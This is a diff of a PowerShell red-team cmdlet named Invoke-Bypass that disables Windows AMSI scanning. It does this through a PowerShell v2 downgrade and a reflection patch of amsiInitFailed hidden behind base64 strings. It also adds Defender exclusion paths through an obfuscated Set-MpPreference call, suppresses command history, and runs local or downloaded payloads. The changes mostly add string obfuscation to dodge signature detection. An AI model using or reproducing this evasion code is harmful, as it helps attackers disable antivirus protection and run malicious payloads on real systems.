@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: Assembly {native}
    Optional Dependencies: IWR {native}
-   PS cmdlet Dev version: v1.1.11
+   PS cmdlet Dev version: v1.1.12
 
 .DESCRIPTION
    This cmdlet attempts to disable AMS1 string scanning within
@@ -70,7 +70,7 @@
    Technic     : 1
    Bypass      : success
    Disclosure  : @mattifestation
-   Description : FORCE_AMSI_ERROR
+   Description : FORCE_AM`SI_ERROR
    POC         : Auto-Execute: payload.ps1
    Report      : string detection disabled on console!
    Executing   : payload.ps1
@@ -92,13 +92,13 @@
 )
 
 
-$cmdletVersion = "v1.1.11"
+$cmdletVersion = "v1.1.12"
 #Cmdlet Global variable declarations
 $ErrorActionPreference = "SilentlyContinue"
 #Disable Powershell Command Logging for current session.
 Set-PSReadlineOption HistorySaveStyle SaveNothing|Out-Null
-$host.UI.RawUI.WindowTitle = "@Invoke-Bypass $cmdletVersion {SSA@RedTeam}"
-Write-Host "`n* Disable AM`S`I within current process." -ForegroundColor Green
+$host.UI.RawUI.WindowTitle = "@Invoke-Bypass $cmdletVersion"
+Write-Host "`n* Disable AM`S`1 within current process." -ForegroundColor Green
 
 If($Technic -lt 1 -or $Technic -gt 4)
 {
@@ -120,7 +120,7 @@ If($Filepath -ne "false")
 If($List -iMatch "^(technic|technics)$")
 {
    write-host "  +" -ForegroundColor DarkYellow -NoNewline;
-   write-host " Listing A`MS`I bypasses available .." -ForegroundColor DarkGray
+   write-host " Listing A`MS`1 bypasses available .." -ForegroundColor DarkGray
    write-host "`n  Technic  Description" -ForegroundColor DarkYellow
    write-host "  -------  -----------"
    write-host "  1        PS`V2_DO`WNGR`ADE"
@@ -131,8 +131,8 @@ If($List -iMatch "^(technic|technics)$")
    write-host "* " -ForegroundColor Green -NoNewline;
    write-host "Syntax examples:" -ForegroundColor DarkGray
    write-host "  .\Invoke-Bypass.ps1 -technic '1'"
-   write-host "  .\Invoke-Bypass.ps1 -technic '2' -filepath 'payload.ps1'"
-   write-host "  .\Invoke-Bypass.ps1 -filepath 'payload.ps1' -ExcludeLocation `"`$Env:TMP`""
+   write-host "  .\Invoke-Bypass.ps1 -technic '2' -filepath 'evil.ps1'"
+   write-host "  .\Invoke-Bypass.ps1 -filepath 'evil.ps1' -ExcludeLocation `"`$Env:TMP`""
    write-host ""
    exit
 }
@@ -141,7 +141,7 @@ If($List -iMatch "^(technic|technics)$")
 write-host "*" -ForegroundColor Green -NoNewline;
 $IoStream = "In@v" + "ok@e-M+m+" + "k@atz" -join ''
 $Forbiden = $IoStream.Replace("@","").Replace("+","i")
-write-host " Executing A`MS`I bypass technic [" -ForegroundColor DarkGray -NoNewline;
+write-host " Executing A`MS`1 bypass technic [" -ForegroundColor DarkGray -NoNewline;
 write-host "$Technic" -ForegroundColor DarkYellow -NoNewline;
 write-host "] .." -ForegroundColor DarkGray
 Start-Sleep -Milliseconds 500
@@ -162,26 +162,25 @@ If($ExcludeLocation -ne "false")
    $bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
    If($bool)
    {
-      $Obfusca = "Set-Mp@Pr"+"efe@ren@ce -Ex@cl@u"+"sio@nPa"+"@th $ExcludeLocation -force"
-      $Deobfuscated = $Obfusca -replace '@',''
+      $MarchalCarmona = "Set-Mp@Pr"+"efe@ren@ce -Ex@cl@u"+"sio@nPa"+"@th $ExcludeLocation -force" -replace '@',''
       $MakeSure = $ExcludeLocation.Split('\')[-1]
-      $Deobfuscated|&('@ex' -replace '@','I')
+      "$MarchalCarmona"|&('@ex' -replace '@','I')
 
       If((Get-MpPreference).ExclusionPath -iMatch "($MakeSure)$")
       {
          write-host "  + " -ForegroundColor DarkYellow -NoNewline;
-         write-host "AV Exclusion Path: '" -ForegroundColor DarkGray -NoNewline; 
+         write-host "AV Exclu`sion Path: '" -ForegroundColor DarkGray -NoNewline; 
          write-host "$ExcludeLocation" -ForegroundColor DarkYellow -NoNewline;
          write-host "'" -ForegroundColor DarkGray;
       }
       Else
       {
-         write-host "  + ExcludeLocation: fail to add exclusion path .." -ForegroundColor Red -BackgroundColor Black;                                           
+         write-host "  + ExcludeLoc`ation: fail to add exclusion path .." -ForegroundColor Red -BackgroundColor Black;                                           
       }
    }
    Else
    {
-      write-host "  + ExcludeLocation: Administrator privs required .." -ForegroundColor Red -BackgroundColor Black;     
+      write-host "  + ExcludeLoca`tion: Administrator privs required .." -ForegroundColor Red -BackgroundColor Black;     
    }
 }
 
@@ -200,7 +199,7 @@ If($Technic -eq 1)
    $TechnicName = "PS`V2_DO`WNGR`ADE"
 
    #Retrieve NET Framework version
-   $NETversions = (Get-ChildItem "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP" -recurse | Get-ItemProperty -name Version -EA 0 | Where-Object { $_.PSChildName -match '^(?!S)\p{L}' }).Version
+   $NETversions = (Get-ChildItem "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP" -recurse|Get-ItemProperty -name Version -EA 0|Where-Object{$_.PSChildName -match '^(?!S)\p{L}'}).Version
    If($NETversions -Match "2.0.50727")
    {
 
@@ -213,39 +212,39 @@ If($Technic -eq 1)
       {
          If($FilePath -Match '\\')
          {
-            $FilePath = $FilePath.Split('\')[-1]    # payload.ps1
+            $FilePath = $FilePath.Split('\')[-1]    # evil.ps1
          }
 
          write-host "  POC         : Execute: $FilePath" -ForegroundColor DarkYellow
-         write-host "  Report      : String detection disabled on console!"
-         write-host "  Executing   : " -ForegroundColor DarkGray -NoNewline;
-         write-host "$FilePath`n" -ForegroundColor Green;
-
-         $DownGradedPSesion = "po@we"+"rsh@el@l -@ver"+"si@on @2 -f@i"+" l@e $FilePath" -replace '@',''
-         powershell -Command "$DownGradedPSesion"
-      }
-      ElseIf($PayloadUrl -ne "false")
-      {
-         $FilePath = $PayloadURL.Split('/')[-1]   # payload.ps1   
-         write-host "  POC         : Execute: $FilePath" -ForegroundColor DarkYellow
-         write-host "  Report      : String detection disabled on console!"
+         write-host "  Report      : String detection DISABLED on console!"
          write-host "  Executing   : " -ForegroundColor DarkGray -NoNewline
          write-host "$FilePath`n" -ForegroundColor Green
 
          $DownGradedPSesion = "po@we"+"rsh@el@l -@ver"+"si@on @2 -f@i"+" l@e $FilePath" -replace '@',''
-         powershell -Command "$DownGradedPSesion"
+         "$DownGradedPSesion"|&('{0}ex' -F'I')
+      }
+      ElseIf($PayloadUrl -ne "false")
+      {
+         $FilePath = $PayloadURL.Split('/')[-1]   # evil.ps1   
+         write-host "  POC         : Execute: $FilePath" -ForegroundColor DarkYellow
+         write-host "  Report      : String detection DISABLED on console!"
+         write-host "  Executing   : " -ForegroundColor DarkGray -NoNewline
+         write-host "$FilePath`n" -ForegroundColor Green
+
+         $DownGradedPSesion = "po@we"+"rsh@el@l -@ver"+"si@on @2 -f@i"+" l@e $FilePath" -replace '@',''
+         "$DownGradedPSesion"|&('{0}ex' -F'I')
       }
       Else
       {
          $returnversion = (Get-Host).Version.Major
          write-host "  POC         : Execute: $Forbiden" -ForegroundColor DarkYellow
-         write-host "  Report      : String detection disabled on console!"
+         write-host "  Report      : String detection DISABLED on console!"
          write-host "  Remark      : Exec 'exit' to return to PS version ${returnversion}"
          write-host "  Executing   : " -ForegroundColor DarkGray -NoNewline;
-         write-host "powershell -version 2`n" -ForegroundColor Green;
+         write-host "powersh`ell -`ve`rsio`n 2`n" -ForegroundColor Green;
 
          $DownGradedPSesion = "po@we"+"rsh@el@l -@ver"+"si@on @2 -f@i"+" l@e $FilePath" -replace '@',''
-         powershell -Command "$DownGradedPSesion"
+         "$DownGradedPSesion"|&('{0}ex' -F'I')
       }
    }
    Else
@@ -322,10 +321,11 @@ ElseIf($Technic -eq 4)
    $TechnicName = "AM`SI_UT`ILS_BAS`E64"
 
    Try{#Ams1 bypass technic n 4
+      $KernelID = "No@nP" + "@ub@lic" -replace '@',''
       [Ref].Assembly.GetType($('Syst'+'em.Manag'+'ement.Autom'+'ation.')+$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('QQBtAHMAaQA=')))+
       $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VQB0AGkAbABzAA==')))).GetField($([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('YQBtAHMAaQA='))+
       $([System.Text.Encoding]::Unicode.GetString($([System.Convert]::FromBase64String('SQBuAGkAdAA='))))+
-      $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RgBhAGkAbABlAGQA')))),$('NonPublic,Static')).SetValue($null,[bool]0x12AE)
+      $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RgBhAGkAbABlAGQA')))),$("$KernelID,Static")).SetValue($null,[bool]0x12AE)
    }Catch{Throw $_}
 }
 
@@ -452,7 +452,7 @@ If($PayloadURL -ne "false")
    #>
 
    #Parse URL data
-   $FilePath = $PayloadURL.Split('/')[-1]   # payload.ps1
+   $FilePath = $PayloadURL.Split('/')[-1]   # evil.ps1
    $DomainName = $PayloadURL.Split('/')[2]  # github
 
    If($PayloadURL -iNotMatch '^[http(s)://]')
